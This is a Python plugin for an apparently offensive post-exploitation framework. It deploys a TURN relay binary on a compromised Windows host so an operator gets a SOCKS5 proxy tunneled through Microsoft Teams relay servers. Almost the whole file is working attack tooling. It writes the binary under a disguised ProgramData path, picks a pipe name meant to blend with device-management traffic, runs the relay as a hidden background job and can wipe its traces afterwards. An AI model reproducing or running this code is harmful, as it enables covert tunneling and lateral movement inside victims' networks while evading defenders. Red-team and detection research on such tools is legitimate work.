"""
lateral_movement/turnt_relay — Deploy and manage turnt-relay on the agent.
MITRE T1090 (Proxy) / T1572 (Protocol Tunneling).

Workflow:
  1. Operator runs turnt-credentials (or turnt_credentials plugin) to get TURN creds
  2. Operator starts turnt-controller -config creds.yaml → receives base64 SDP offer
  3. Use this plugin with action=start and offer=<base64> → relay starts on agent,
     returns base64 SDP answer
  4. Operator pastes answer into turnt-controller → TURN tunnel established
  5. Operator now has SOCKS5 proxy through *.relay.teams.microsoft.com:443

The relay binary can be:
  a) Pre-staged via smb_upload / upload_file
  b) Auto-uploaded by this plugin if relay_bin_b64 param is provided
  c) Built locally via: builder -f turnt-relay --arch x64
"""
from __future__ import annotations

import base64
from pathlib import Path

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class TurntRelay(BasePlugin):
    NAME        = "turnt_relay"
    DESCRIPTION = "Deploy turnt-relay on agent and exchange SDP offer/answer for TURN tunnel (T1572)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1572"
    CATEGORY    = "lateral_movement"
    VERSION     = "1.0.0"

    # Default drop path on agent (hidden in ProgramData)
    _DEFAULT_DROP = r"C:\ProgramData\Microsoft\Windows\DeviceSync\mdmrelay.exe"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="start",
              help="start | status | stop | clean"),
        Param("offer", str, required=False, default="",
              help="[start] Base64 SDP offer from turnt-controller"),
        Param("relay_path", str, required=False, default=_DEFAULT_DROP,
              help="Path to turnt-relay binary on agent (must already exist, or provide relay_bin_b64)"),
        Param("relay_bin_b64", str, required=False, default="",
              help="[optional] Base64 turnt-relay.exe to upload if not already on agent"),
        Param("relay_bin_path", str, required=False, default="",
              help="[optional] Local path to turnt-relay.exe on operator machine to upload"),
        Param("pipe_name", str, required=False, default="mdm-relay",
              help="Internal named pipe used by turnt-relay (leave default to blend with MDM traffic)"),
        Param("timeout", int, required=False, default=60),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action        = params.get("action", "start").lower()
        offer         = params.get("offer", "").strip()
        relay_path    = params.get("relay_path", self._DEFAULT_DROP)
        relay_bin_b64 = params.get("relay_bin_b64", "")
        relay_bin_path= params.get("relay_bin_path", "")
        timeout       = int(params.get("timeout", 60))

        # load relay binary from local path if given
        if relay_bin_path and not relay_bin_b64:
            p = Path(relay_bin_path)
            if not p.exists():
                return ModuleResult.err(f"relay_bin_path not found: {relay_bin_path}")
            relay_bin_b64 = base64.b64encode(p.read_bytes()).decode()

        if action == "start":
            if not offer:
                return ModuleResult.err(
                    "offer is required for action=start.\n"
                    "Run turnt-controller -config creds.yaml on operator machine "
                    "and pass the printed base64 SDP offer here."
                )
            ps = self._ps_start(relay_path, relay_bin_b64, offer)
        elif action == "status":
            ps = self._ps_status(relay_path)
        elif action == "stop":
            ps = self._ps_stop(relay_path)
        elif action == "clean":
            ps = self._ps_clean(relay_path)
        else:
            return ModuleResult.err("action must be: start | status | stop | clean")

        r = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"turnt_relay failed: {r['output']}")

        output = r["output"]
        if action == "start":
            # Extract the answer for the operator
            answer = self._parse_answer(output)
            if answer:
                msg = (
                    f"{output}\n\n"
                    f"[+] Paste this answer into turnt-controller:\n\n{answer}\n"
                )
                return ModuleResult.ok(data=msg, loot_kind="turnt_relay",
                                       label="TURN tunnel SDP answer")
        return ModuleResult.ok(data=output, loot_kind="turnt_relay")

    @staticmethod
    def _parse_answer(output: str) -> str:
        for line in output.splitlines():
            line = line.strip()
            # turnt-relay prints the answer as a long base64 line prefixed with ANSWER:
            if line.startswith("ANSWER:"):
                return line[7:].strip()
            # or just a standalone base64 blob >= 200 chars
            if len(line) >= 200 and all(c in
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                    for c in line):
                return line
        return ""

    @staticmethod
    def _ps_start(relay_path: str, bin_b64: str, offer: str) -> str:
        upload_block = ""
        if bin_b64:
            upload_block = f"""
# Upload relay binary
$binBytes = [Convert]::FromBase64String('{bin_b64}')
$binDir   = Split-Path '{relay_path}'
if (-not (Test-Path $binDir)) {{ New-Item -ItemType Directory -Force $binDir | Out-Null }}
[System.IO.File]::WriteAllBytes('{relay_path}', $binBytes)
$results += "[+] Relay binary written ($($binBytes.Length) bytes) → {relay_path}"
"""
        return rf"""
$results = @("[*] turnt_relay — starting TURN relay on agent")
{upload_block}
if (-not (Test-Path '{relay_path}')) {{
    $results += "[-] Relay binary not found: {relay_path}"
    $results += "[*] Provide relay_bin_b64 or relay_bin_path to upload the binary"
    $results += "[*] Build with: builder -f turnt-relay --arch x64"
    $results -join "`n"; exit
}}

$results += "[+] Relay binary found: {relay_path}"
$results += "[*] Launching turnt-relay with SDP offer..."

# Run relay in a hidden background job, capture stdout for the answer
$jobScript = {{
    param($bin, $offer)
    & $bin -offer $offer 2>&1
}}

$job = Start-Job -ScriptBlock $jobScript -ArgumentList '{relay_path}', '{offer}'
$results += "[*] Job started (ID=$($job.Id)) — waiting up to 30s for SDP answer..."

# Poll for answer line in job output
$answer = ""
$deadline = (Get-Date).AddSeconds(30)
while ((Get-Date) -lt $deadline -and -not $answer) {{
    Start-Sleep -Milliseconds 500
    $out = Receive-Job $job -Keep 2>&1
    foreach ($line in ($out -split "`n")) {{
        $line = $line.Trim()
        if ($line.Length -ge 100 -and $line -match '^[A-Za-z0-9+/=]{{100,}}$') {{
            $answer = $line; break
        }}
        if ($line -match '^ANSWER:') {{
            $answer = $line.Substring(7).Trim(); break
        }}
    }}
}}

if ($answer) {{
    $results += "[+] SDP answer received from relay"
    $results += "ANSWER:$answer"
}} else {{
    $jobOut = Receive-Job $job -Keep 2>&1
    $results += "[-] No answer within 30s — relay output:"
    $results += ($jobOut -join "`n")
    $results += "[*] Check that turnt-controller is running and the offer is valid"
}}

# Store job ID for status/stop
$jobIdFile = "$env:TEMP\.turnt_relay_job"
$job.Id | Set-Content $jobIdFile -Force

$results -join "`n"
""".strip()

    @staticmethod
    def _ps_status(relay_path: str) -> str:
        return rf"""
$results = @("[*] turnt_relay status")
$jobIdFile = "$env:TEMP\.turnt_relay_job"
if (Test-Path $jobIdFile) {{
    $jobId = [int](Get-Content $jobIdFile)
    $job   = Get-Job -Id $jobId -ErrorAction SilentlyContinue
    if ($job) {{
        $results += "[+] Relay job ID=$jobId  State=$($job.State)"
        $out = Receive-Job $job -Keep 2>&1
        if ($out) {{ $results += ($out | Select-Object -Last 10 | ForEach-Object {{ "  $_" }}) }}
    }} else {{
        $results += "[-] Job ID=$jobId not found — relay may have exited"
    }}
}} else {{
    $results += "[-] No relay job ID file found — relay not started via this session"
}}
# Check process by binary name as fallback
$proc = Get-Process -ErrorAction SilentlyContinue |
    Where-Object {{ $_.Path -eq '{relay_path}' }}
if ($proc) {{
    $results += "[+] Process: PID=$($proc.Id)  Name=$($proc.Name)"
}} else {{
    $results += "[*] No running process matching relay path"
}}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_stop(relay_path: str) -> str:
        return rf"""
$results = @("[*] turnt_relay — stopping")
$jobIdFile = "$env:TEMP\.turnt_relay_job"
if (Test-Path $jobIdFile) {{
    $jobId = [int](Get-Content $jobIdFile)
    $job   = Get-Job -Id $jobId -ErrorAction SilentlyContinue
    if ($job) {{
        Stop-Job  $job
        Remove-Job $job
        $results += "[+] Job $jobId stopped and removed"
    }}
    Remove-Item $jobIdFile -Force
}}
$proc = Get-Process -ErrorAction SilentlyContinue |
    Where-Object {{ $_.Path -eq '{relay_path}' }}
if ($proc) {{
    $proc | Stop-Process -Force
    $results += "[+] Killed PID=$($proc.Id)"
}} else {{
    $results += "[*] No matching process to kill"
}}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_clean(relay_path: str) -> str:
        return rf"""
$results = @("[*] turnt_relay — cleaning up")
# Stop first
$proc = Get-Process -ErrorAction SilentlyContinue |
    Where-Object {{ $_.Path -eq '{relay_path}' }}
if ($proc) {{ $proc | Stop-Process -Force; $results += "[+] Process killed" }}
# Remove binary
if (Test-Path '{relay_path}') {{
    Remove-Item '{relay_path}' -Force
    $results += "[+] Removed: {relay_path}"
}}
# Remove job file
$jf = "$env:TEMP\.turnt_relay_job"
if (Test-Path $jf) {{ Remove-Item $jf -Force; $results += "[+] Removed job file" }}
$results -join "`n"
""".strip()
